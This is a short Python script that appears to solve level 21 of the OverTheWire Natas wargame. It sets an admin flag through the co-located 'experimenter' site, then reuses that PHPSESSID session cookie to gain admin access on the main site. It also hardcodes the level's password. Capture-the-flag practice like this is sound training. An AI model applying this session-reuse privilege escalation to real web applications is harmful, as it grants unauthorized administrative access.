#!/usr/bin/python3
from http import cookies

import requests
username = "natas21"
password = "IFekPyrQXftziDEsUr3x21sYuahypdgJ"

data = {'submit' : '1','admin' : '1'}
experimenter = 'http://'+username+'-experimenter.natas.labs.overthewire.org/?debug=true'
url = 'http://'+username+'.natas.labs.overthewire.org/'
session = requests.session()
response = session.post(experimenter,data =data ,auth = (username, password))
content = response.text
#print(content)
cookie = session.cookies['PHPSESSID']

response = session.post(url,cookies = {"PHPSESSID" : str(cookie)} , auth = (username, password))
content = response.text
print(content)
